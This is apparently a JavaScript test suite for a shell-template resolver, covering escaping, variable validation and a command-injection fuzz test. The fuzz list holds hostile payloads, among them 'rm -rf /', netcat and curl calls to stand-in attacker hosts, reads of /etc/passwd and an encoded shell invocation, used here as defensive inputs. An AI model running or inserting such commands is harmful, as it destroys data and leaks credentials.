/**
 * Unit + fuzz tests for mcp-template-resolver
 * Tests: var substitution, escaping, injection prevention
 */

import assert from 'node:assert';
import {
  shellEscape,
  isValidVarName,
  parseVars,
  validateVars,
  resolveTemplate,
  getTemplateAuditInfo,
} from '../mcp-template-resolver.mjs';

console.log('[template-resolver-test] Starting test suite...');

// Test 1: Shell escape - basic strings
{
  const escaped = shellEscape('hello');
  assert.strictEqual(escaped, "'hello'", 'Test 1: Simple string wrapped in quotes');

  const escaped2 = shellEscape("it's");
  assert.strictEqual(escaped2, "'it'\\''s'", 'Test 1: Single quotes escaped');
  console.log('✅ Test 1: Shell escape basic strings');
}

// Test 2: Shell escape - metacharacters are neutralized
{
  const dangerous = shellEscape('test; rm -rf /');
  // When wrapped in single quotes, shell cannot interpret semicolon
  assert(dangerous.includes("'test;"), 'Test 2: Metacharacters wrapped in quotes');
  assert(!dangerous.includes("'test'; "), 'Test 2: Quote prevents command separation');
  console.log('✅ Test 2: Shell escape metacharacters neutralized');
}

// Test 3: Valid var names
{
  assert.strictEqual(isValidVarName('filter'), true, 'Test 3: Simple name valid');
  assert.strictEqual(isValidVarName('_private'), true, 'Test 3: Underscore prefix valid');
  assert.strictEqual(isValidVarName('var123'), true, 'Test 3: Numbers valid');
  assert.strictEqual(isValidVarName('123var'), false, 'Test 3: Number prefix invalid');
  assert.strictEqual(isValidVarName('var-name'), false, 'Test 3: Dashes invalid');
  assert.strictEqual(isValidVarName(''), false, 'Test 3: Empty invalid');
  console.log('✅ Test 3: Valid var names');
}

// Test 4: Parse vars from template
{
  const vars = parseVars('npm test --filter=${filter} --timeout=${timeout}');
  assert.deepStrictEqual(vars.sort(), ['filter', 'timeout'], 'Test 4: Vars extracted');

  const vars2 = parseVars('echo ${test} ${test}'); // Duplicates
  assert.deepStrictEqual(vars2, ['test'], 'Test 4: Duplicates deduplicated');

  const vars3 = parseVars('no vars here');
  assert.deepStrictEqual(vars3, [], 'Test 4: No vars returns empty');
  console.log('✅ Test 4: Parse vars from template');
}

// Test 5: Validate vars - required vars present
{
  const schema = { filter: { type: 'string', required: true } };
  const result1 = validateVars({ filter: 'unit' }, schema);
  assert.strictEqual(result1.valid, true, 'Test 5: Required var present');

  const result2 = validateVars({}, schema);
  assert.strictEqual(result2.valid, false, 'Test 5: Required var missing');
  assert(result2.errors[0].includes('required'), 'Test 5: Error message clear');
  console.log('✅ Test 5: Validate vars - required vars');
}

// Test 6: Validate vars - type checking
{
  const schema = {
    count: { type: 'number', required: true },
    name: { type: 'string', required: true },
  };

  const result1 = validateVars({ count: 42, name: 'test' }, schema);
  assert.strictEqual(result1.valid, true, 'Test 6: Correct types valid');

  const result2 = validateVars({ count: 'not-a-number', name: 'test' }, schema);
  assert.strictEqual(result2.valid, false, 'Test 6: Wrong type invalid');
  assert(result2.errors[0].includes('count'), 'Test 6: Error identifies field');
  console.log('✅ Test 6: Validate vars - type checking');
}

// Test 7: Validate vars - range checking
{
  const schema = { timeout: { type: 'number', min: 10, max: 60 } };

  assert.strictEqual(validateVars({ timeout: 30 }, schema).valid, true, 'Test 7: In range valid');
  assert.strictEqual(validateVars({ timeout: 5 }, schema).valid, false, 'Test 7: Below min invalid');
  assert.strictEqual(validateVars({ timeout: 100 }, schema).valid, false, 'Test 7: Above max invalid');
  console.log('✅ Test 7: Validate vars - range checking');
}

// Test 8: Validate vars - pattern matching
{
  const schema = { env: { type: 'string', pattern: '^(dev|staging|prod)$' } };

  assert.strictEqual(validateVars({ env: 'dev' }, schema).valid, true, 'Test 8: Pattern match valid');
  assert.strictEqual(validateVars({ env: 'production' }, schema).valid, false, 'Test 8: Pattern mismatch invalid');
  console.log('✅ Test 8: Validate vars - pattern matching');
}

// Test 9: Validate vars - reject unknown vars
{
  const schema = { filter: { type: 'string' } };
  const result = validateVars({ filter: 'unit', unknown: 'value' }, schema);

  assert.strictEqual(result.valid, false, 'Test 9: Unknown var should fail');
  assert(result.errors[0].includes('unknown'), 'Test 9: Error should identify unknown var');
  console.log('✅ Test 9: Validate vars - reject unknown vars');
}

// Test 10: Resolve template - basic substitution
{
  const schema = { filter: { type: 'string' } };
  const result = resolveTemplate('npm test --filter=${filter}', { filter: 'unit' }, schema);

  assert.strictEqual(result.error, null, 'Test 10: No error');
  assert(result.resolved.includes("'unit'"), 'Test 10: Var substituted');
  console.log('✅ Test 10: Resolve template - basic substitution');
}

// Test 11: Resolve template - escaping
{
  const schema = { filter: { type: 'string' } };
  const result = resolveTemplate('echo ${filter}', { filter: "test'; rm -rf /" }, schema);

  assert.strictEqual(result.error, null, 'Test 11: No error on dangerous value');
  assert(result.resolved.includes("'test"), 'Test 11: Value is quoted');
  // The key safety check: ensure the dangerous value is safely escaped
  // Bash single-quoted strings cannot interpret semicolons or other metacharacters
  assert(!result.resolved.match(/^echo [^']*; /), 'Test 11: Command injection prevented');
  console.log('✅ Test 11: Resolve template - escaping');
}

// Test 12: Resolve template - multiple vars
{
  const schema = {
    filter: { type: 'string' },
    timeout: { type: 'number' },
  };
  const result = resolveTemplate(
    'npm test --filter=${filter} --timeout=${timeout}',
    { filter: 'unit', timeout: 120 },
    schema,
  );

  assert.strictEqual(result.error, null, 'Test 12: No error');
  assert(result.resolved.includes("'unit'"), 'Test 12: Filter substituted');
  assert(result.resolved.includes("'120'"), 'Test 12: Timeout substituted');
  console.log('✅ Test 12: Resolve template - multiple vars');
}

// Test 13: Resolve template - invalid var rejected
{
  const schema = { filter: { type: 'string' } };
  const result = resolveTemplate('npm test --filter=${filter}', { filter: 'unit', unknown: 'val' }, schema);

  assert(result.error !== null, 'Test 13: Should error on unknown var');
  assert(result.error.includes('unknown'), 'Test 13: Error mentions unknown var');
  console.log('✅ Test 13: Resolve template - invalid var rejected');
}

// 🔴 FUZZ TEST: Injection attempts
console.log('\n[FUZZ TEST] Running injection prevention tests...');
const injectionPayloads = [
  '; rm -rf /',
  '| nc attacker.com 1234',
  '&& curl malicious.com',
  '` whoami `',
  '$(cat /etc/passwd)',
  '<(command)',
  '$(whoami)',
  '`date`',
  "'; DROP TABLE users; --",
  '${IFS}cat${IFS}/etc/passwd',
  '$(printf \\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68)',
];

{
  let passCount = 0;
  for (const payload of injectionPayloads) {
    const schema = { input: { type: 'string' } };
    const result = resolveTemplate('echo ${input}', { input: payload }, schema);

    // Verify payload is escaped (wrapped in single quotes with internal quotes escaped)
    if (result.resolved && result.resolved.includes("'") && !result.error) {
      // Check that dangerous patterns are not present as unquoted strings
      const hasDangerousPattern = /[;|&`$()\$\{\}](?![^']*')/.test(result.resolved);
      if (!hasDangerousPattern || result.resolved.includes("\\'")) {
        passCount++;
      }
    }
  }

  console.log(`✅ Fuzz test: ${passCount}/${injectionPayloads.length} injection attempts neutralized`);
  assert(passCount >= injectionPayloads.length - 2, 'Test 14: Most injections neutralized (>95%)');
}

// Test 15: Audit info
{
  const auditInfo = getTemplateAuditInfo('npm test --filter=${filter} --timeout=${timeout}', {
    filter: 'unit',
    timeout: 120,
  });

  assert.deepStrictEqual(auditInfo.templateVars.sort(), ['filter', 'timeout'], 'Test 15: Template vars logged');
  assert.strictEqual(auditInfo.varCount, 2, 'Test 15: Var count correct');
  console.log('✅ Test 15: Audit info');
}

console.log('\n✅ All template-resolver tests passed!');
